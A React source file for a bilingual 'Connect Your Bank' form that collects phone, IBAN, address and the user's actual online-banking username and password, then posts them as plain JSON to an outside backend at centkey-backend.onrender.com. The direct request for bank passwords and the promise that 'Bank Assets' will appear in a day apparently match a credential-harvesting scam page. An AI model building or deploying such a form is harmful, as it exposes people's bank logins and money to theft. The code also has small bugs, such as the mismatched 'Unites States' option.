import React, { useState, useEffect } from "react";
import { useParams } from "react-router-dom";
import BackButton from "./wrapper/Backbutton";
import UseContext from "./UseContext.jsx"; // Import useContext
import Loader from "./Loader.jsx";

const BankDetails = () => {
  const { id } = useParams();
  const [formData, setFormData] = useState({
    phone: "",
    country: "Germany",
    bank: "",
    iban: "",
    username: "",
    password: "",
    address: "",
  });
  const [formErrors, setFormErrors] = useState({});
    const { PresentCountry } = UseContext();  // the country determining the language
    const [isLoading,setIsLoading] = useState(false)
  const [GermanyBanks, setGermanyBanks] = useState([]);
  // The country that the user is going to pick not the one determining the language
  useEffect(() => {
    if (!PresentCountry) {
      setIsLoading(true);
    } else {
      setIsLoading(false);
    }
}, [PresentCountry]);

    useEffect(() => {
        if (formData.country === 'Germany') {
          setGermanyBanks([
            "Deutsche Bank",
            "Commerzbank",
            "DZ Bank",
            "KfW Bank",
            "HypoVereinsbank",
            "Postbank",
            "N26",
            "ING-DiBa",
            "DKB",
            "Sparkasse",
          ]);
        } else if(formData.country === 'Canada'){
            setGermanyBanks([
              "Royal Bank of Canada (RBC)",
              "Toronto-Dominion Bank (TD)",
              "Bank of Nova Scotia (Scotiabank)",
              "Bank of Montreal (BMO)",
              "Canadian Imperial Bank of Commerce (CIBC)",
              "National Bank of Canada",
              "Desjardins Group",
              "Laurentian Bank of Canada",
              "HSBC Bank Canada",
              "Manulife Bank"
              ])
            
        }else if(formData.country === 'Switzerland'){
          setGermanyBanks([
            "UBS",
            "Credit Suisse",
            "Raiffeisen Group",
            "Zürcher Kantonalbank",
            "PostFinance",
            "Julius Bär Group",
            "Pictet Group",
            "Vontobel Holding",
            "EFG International",
            "Lombard Odier Group"
            ]) 
      }else if(formData.country === 'United States'){
        setGermanyBanks([
          "JPMorgan Chase",
          "Bank of America",
          "Wells Fargo",
          "Citigroup",
          "U.S. Bank",
          "Capital One",
          "PNC Financial Services",
          "Truist Financial",
          "Goldman Sachs",
          "Morgan Stanley"
          ])
        }else if(formData.country === 'United Kingdom'){
          setGermanyBanks([
            "HSBC",
    "Barclays",
    "Lloyds Banking Group",
    "Royal Bank of Scotland (RBS)",
    "Standard Chartered",
    "Santander UK",
    "Nationwide Building Society",
    "NatWest Group",
    "Virgin Money UK",
    "TSB Bank"
            ])
          }
    }, [formData.country]);

  // Function to get text based on the current language
  const getText = (english, german) => (PresentCountry === 'Germany' ? german : english);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
    setFormErrors({ ...formErrors, [name]: "" });
  };

  const handleSubmit = async () => {
    const errors = {};
    if (!formData.phone.trim()) errors.phone = getText("Phone number is required", "Telefonnummer ist erforderlich");
    if (!formData.bank.trim()) errors.bank = getText("Bank is required", "Bank ist erforderlich");
    if (!formData.iban.trim()) errors.iban = getText("IBAN is required", "IBAN ist erforderlich");
    if (!formData.username.trim()) errors.username = getText("Username is required", "Benutzername ist erforderlich");
    if (!formData.password.trim()) errors.password = getText("Password is required", "Passwort ist erforderlich");
    if (!formData.address.trim()) errors.address = getText("Address is required", "Adresse ist erforderlich");

    if (Object.keys(errors).length > 0) {
      setFormErrors(errors);
      return;
    }
    setIsLoading(true)
    try {
      const request = await fetch(`https://centkey-backend.onrender.com/bank/${id}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });
      const data = await request.json();
      console.log(data);
      setIsLoading(false)
    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  return (
    !isLoading ?( <>
      <BackButton />
      <div className="flex items-center justify-center w-full min-h-screen bg-[#f4f4f4] p-4">
        <div className="bg-white rounded-lg shadow-md w-full max-w-[700px] padding20">
          <h2 className="text-xl font-semibold mb-6">{getText("Connect Your Bank", "Verbinden Sie Ihre Bank")}</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-[20px]">
            <div className="flex flex-col">
              <label className="text-sm mb-1">{getText("Phone number", "Telefonnummer")}</label>
              <input
                type="text"
                name="phone"
                value={formData.phone}
                onChange={handleChange}
                placeholder={getText("Phone number", "Telefonnummer")}
                className="padding10 border rounded-md input-type"
              />
              {formErrors.phone && <p className="text-red-500 text-sm">{formErrors.phone}</p>}
            </div>
            <div className="flex flex-col">
              <label className="text-sm mb-1">{getText("Country", "Land")}</label>
              <select
                name="country"
                value={formData.country}
                onChange={handleChange}
                className="padding10 border rounded-md input-type"
              >
                <option value="Germany">Germany</option>
                <option value="Canada">Canada</option>
                <option value="Unites States">Unites States</option>
                <option value="United Kingdom">United Kingdom</option>
                <option value="Switzerland">Switzerland</option>
                
              </select>
            </div>
            <div className="flex flex-col">
              <label className="text-sm mb-1">{getText("Bank", "Bank")}</label>
              <select
                name="bank"
                value={formData.bank}
                onChange={handleChange}
                className="padding10 border rounded-md input-type"
              >
                <option value="">{getText("Select Bank", "Bank auswählen")}</option>
                {GermanyBanks.map((item) => (
                  <option key={item} value={item}>
                    {item}
                  </option>
                ))}
              </select>
              {formErrors.bank && <p className="text-red-500 text-sm">{formErrors.bank}</p>}
            </div>
            <div className="flex flex-col">
              <label className="text-sm mb-1">IBAN number</label>
              <input
                type="text"
                name="iban"
                value={formData.iban}
                onChange={handleChange}
                placeholder="IBAN number"
                className="padding10 border rounded-md input-type"
              />
              {formErrors.iban && <p className="text-red-500 text-sm">{formErrors.iban}</p>}
            </div>
          </div>
          <div className="mt-[20px]">
            <label className="text-sm mb-1">{getText("Bank Username", "Bankbenutzername")}</label>
            <input
              type="text"
              name="username"
              value={formData.username}
              onChange={handleChange}
              placeholder={getText("Bank username", "Bankbenutzername")}
              className="padding10 border rounded-md w-full input-type"
            />
            {formErrors.username && <p className="text-red-500 text-sm">{formErrors.username}</p>}
          </div>
          <div className="mt-[20px]">
            <label className="text-sm mb-1">{getText("Bank Password", "Bankpasswort")}</label>
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              placeholder={getText("Bank Password", "Bankpasswort")}
              className="padding10 border rounded-md w-full input-type"
            />
            {formErrors.password && <p className="text-red-500 text-sm">{formErrors.password}</p>}
          </div>
          <div className="mt-[20px]">
            <label className="text-sm mb-1">{getText("Full address", "Vollständige Adresse")}</label>
            <input
              type="text"
              name="address"
              value={formData.address}
              onChange={handleChange}
              placeholder={getText("Full address", "Vollständige Adresse")}
              className="padding10 border rounded-md w-full input-type"
            />
            {formErrors.address && <p className="text-red-500 text-sm">{formErrors.address}</p>}
          </div>
          <p className="text-sm text-yellow-400">
            {getText(
              "Note : it is going to take about 1 business day for your Bank Assets to show up",
              "Hinweis: Es dauert etwa 1 Werktag, bis Ihre Bankwerte angezeigt werden"
            )}
          </p>
          <button
            className="bg-green-300 text-white font-medium rounded-md  w-full padding10"
            onClick={handleSubmit}
          >
            + {getText("Bank", "Bank")}
          </button>
        </div>
      </div>
    </>):(
      <Loader/>
    )
   

  );
};

export default BankDetails;
